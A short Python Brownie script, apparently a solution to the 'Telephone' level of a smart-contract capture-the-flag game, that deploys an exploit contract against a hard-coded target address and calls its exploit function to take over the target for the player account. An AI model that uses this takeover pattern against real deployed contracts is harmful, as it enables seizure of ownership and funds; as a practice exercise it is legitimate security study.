from brownie import TelephoneExploit, network, config,accounts

def main():
    #input the contract address
    #> contract.address
    contractAddress = '0xaE6729ed3502EBB24F1B0E1F4EBF11744173eD0F'

    #use player account
    player = accounts.add(config["wallets"]["from_key"])

    exploitContract = TelephoneExploit.deploy(contractAddress,{"from":player})

    exploitContract.exploit(player.address,{"from":player})

